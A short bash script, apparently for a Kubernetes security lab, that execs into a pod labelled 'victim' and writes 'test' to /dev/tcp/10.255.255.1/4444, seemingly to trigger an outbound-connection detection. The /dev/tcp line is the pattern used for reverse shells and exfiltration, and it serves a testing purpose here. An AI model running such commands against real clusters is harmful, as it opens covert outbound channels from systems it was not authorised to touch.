#!/usr/bin/env bash
set -euo pipefail
POD=$(kubectl get pod -n security-lab -l app=victim -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n security-lab "$POD" -- sh -c 'sh -c "echo test >/dev/tcp/10.255.255.1/4444"' 2>/dev/null || true
